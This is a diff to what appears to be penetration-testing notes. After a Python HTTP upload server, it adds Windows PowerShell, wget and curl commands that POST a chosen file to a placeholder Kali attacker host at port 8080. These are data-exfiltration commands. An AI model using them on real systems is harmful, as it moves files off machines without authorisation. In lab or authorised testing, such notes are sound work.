@@ -121,5 +121,10 @@ if __name__ == "__main__":
     print(f"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)")
     httpd.serve_forever()
 ```
-
+Then on Windows:
 `Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`
+
+Similarly on Linux:
+`wget --method=POST --header="filename: {filename}" --body-file="{filename}" http://{kali_IP}:8080/upload`
+or 
+`curl -X POST -H "filename: {filename}" --data-binary "@{filename}" http://{kali_IP}:8080/upload`
